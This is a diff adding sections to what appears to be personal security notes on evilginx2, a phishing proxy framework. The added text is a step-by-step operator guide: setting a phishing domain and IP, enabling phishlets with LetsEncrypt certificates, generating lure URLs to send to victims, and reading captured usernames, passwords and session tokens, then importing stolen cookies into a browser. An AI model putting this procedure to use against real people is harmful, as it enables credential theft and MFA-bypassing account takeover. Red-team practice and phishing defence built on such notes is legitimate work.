@@ -36,6 +36,89 @@ Here's a [[u2f#List of U2F Websites|list of websites that requires U2F authentic
 
 ---
 
+## Configure for Phishing
+
+You need to configure `evilginx` to work with your domain you are phishing from and its public IP address.
+
+Executing the following commands within `evilginx2`:
+
+```txt
+: config domain $PHISHING_DOMAIN
+: config ip $PUBLIC_IP_OF_EVILGINX2_HOST
+```
+
+- `$PHISHING_DOMAIN` is the domain you are phishing from
+
+---
+
+## Load a Phishlet
+
+```txt
+: phishlets hostname $PHISHLET $DOMAIN_NAME
+```
+
+- `$PHISHLET` is the name of the phishlet
+- `$DOMAIN_NAME` is the phishing domain name that will be in the URL you send in your phishes
+	- i.e., `microsoft.phishinglnc.com`
+
+---
+
+## Enable a Phishlet
+
+```txt
+: phishlets enable $PHISHLET
+```
+
+- `$PHISHLET` is the name of the phishlet
+
+Two significant considerations:
+
+1. If not in [[evilginx2#Developer Mode|developer mode]], this will attempt to generate a TLS certificate for the domain specified when [[evilginx2#Load a Phishlet|loading the phishlet]] via LetsEncrypt. Make sure `evilginx2` is listening on port 80 for this.
+
+2. If not in [[evilginx2#Developer Mode|developer mode]], the certificate generation process will likely fail at first. The error output will show you various URLs that LetsEncrypt is attempting to reach. You'll need to add A records for each of these URLs that point to your server's public IP address.
+
+---
+
+## Generate a Phishing URL
+
+With `evilginx2` properly configured and the desired phishlet loaded and enabled, create a lure for the phishlet.
+
+```txt
+: lures create $PHISHLET
+```
+
+This will return a lure ID. Retrieve the URl corresponding to the lure.
+
+```txt
+: lures get-url $LURE_ID
+```
+
+Test the URL in your own browser and make sure `evilginx2` sees the activity.
+
+---
+
+## View Sessions
+
+Whenever a user clicks one of your URLs, it will start a new session. To view these sessions:
+
+```txt
+: sessions
+```
+
+---
+
+## View Session Data (Credentials)
+
+To view a session's username, password, and token:
+
+```txt
+: sessions $SESSION_ID
+```
+
+Note that tokens are output in JSON, so you'll need to be using a cookie browser extension that imports cookies as JSON to use it easily (like [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)).
+
+---
+
 ## Phishlets
 
 Phishlets are YAML configuration files for each phished site. They define which subdomains are needed to properly proxy to a specific site, what strings should be replaced in relayed packets, which cookies should be captured, and more.
